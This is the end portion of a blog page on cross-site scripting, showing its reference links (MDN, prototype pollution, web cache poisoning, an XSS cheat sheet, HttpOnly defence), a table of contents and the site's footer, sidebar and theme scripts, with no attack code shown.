<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdA==">JavaScript | MDN (mozilla.org)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL3JlYWQvamF2YXNjcmlwdC10dXRvcmlhbC9SRUFETUUubWQ=">介绍 - 《阮一峰 JavaScript 教程》</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yZXNlYXJjaC5zZWN1cml0dW0uY29tLw==">research.securitum.com - securitum.com vulnerabilities researches and cyber security education publications</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTU2MzU2">实战 Web 缓存投毒（上）- 安全客 - 安全资讯平台 (anquanke.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvcmVzZWFyY2gvcHJhY3RpY2FsLXdlYi1jYWNoZS1wb2lzb25pbmc=">https://portswigger.net/research/practical-web-cache-poisoning</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly94c3MuYnkvI2NoZWF0c2hlZXQ=">https://xss.by/#cheatsheet</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ2wwdWQvcC8xMzE5MDQxMy5odG1s">XSS 漏洞防御之 HttpOnly - 春告鳥 - 博客园 (cnblogs.com)</span></p>

      <div class="tags">
          <a href="/tags/XSS/" rel="tag"><i class="ic i-tag"></i> XSS</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-10-29 19:35:17" itemprop="dateModified" datetime="2022-10-29T19:35:17+08:00">2022-10-29</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/02/17/XSS/" title="XSS">http://example.com/2022/02/17/XSS/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
    </div>
    <div class="item right">
      

  <a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="SQL injection">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>SQL injection</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss"><span class="toc-number">1.</span> <span class="toc-text"> XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session-cookie"><span class="toc-number">1.1.</span> <span class="toc-text"> session || cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">1.2.</span> <span class="toc-text"> 1. 反射型 xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">1.3.</span> <span class="toc-text"> 2. 存储型 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%9F%BA%E4%BA%8Edom%E7%9A%84"><span class="toc-number">1.4.</span> <span class="toc-text"> 3. 基于 DOM 的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text"> 浏览器解析机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.1.</span> <span class="toc-text"> HTML 解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.6.</span> <span class="toc-text"> 参考</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li class="active"><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">10</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">3</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">4</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/10/16/hello-world/" title="Hello World">Hello World</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/02/17/XSS/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
